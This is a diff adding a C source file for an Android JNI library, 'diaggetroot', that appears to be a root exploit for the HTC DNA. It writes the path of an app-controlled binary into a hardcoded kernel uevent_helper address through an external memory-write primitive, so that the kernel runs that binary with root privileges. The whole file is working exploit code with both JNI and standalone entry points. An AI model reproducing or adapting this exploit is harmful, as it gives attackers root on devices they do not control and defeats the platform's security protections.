@@ -1,0 +1,66 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <jni.h>
+#include <sys/mman.h>
+
+#define  LOG_TAG    "diaggetroot"
+#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
+#define  LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
+#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)
+
+#include <android/log.h>
+
+struct values {
+    unsigned addr;
+    unsigned short value;
+};
+
+extern void b(void* adr, int value, int fd);
+
+int cmpare( const void * a , const void * b ) {
+    const struct values *x = a;
+    const struct values *y = b;
+    if(x->value < y->value) {
+       return -1;
+    }
+    if(x->value == y->value) {
+       return 0;
+    }
+    return 1;
+}
+
+static void uevent_helper_mod(int fd)
+{
+    unsigned _buf = 0xc0d34518; //htc dna uevent_helper_buffer
+    const char* path="/data/data/c.fyf/files/getroot\0";
+    struct values datas[400];
+    int i, j;
+    j=0;
+    for(i=0; i<strlen(path); i+=2){
+    datas[j].addr = _buf+ i;
+ //     datas[j].value = path[i] | (path[i+1] << 8);
+      datas[j].value = path[i] | (path[i+1] << 8);
+      j++;
+    }
+    qsort( datas, j, sizeof(struct values), cmpare);
+    for(i=0; i<j; i++){
+        LOGD("data[%d] addr=%x value=%x", i, datas[i].addr, datas[i].value);
+        b((void*)datas[i].addr, datas[i].value, fd);
+    }
+}
+
+void
+Java_c_fyf_MainActivity_getrootnative( JNIEnv* env,
+                                                  jobject thiz, int fd)
+{
+    uevent_helper_mod(fd);
+}
+
+int main(int argc, char** argv)
+{
+    uevent_helper_mod(0);
+    return 0;
+}
+
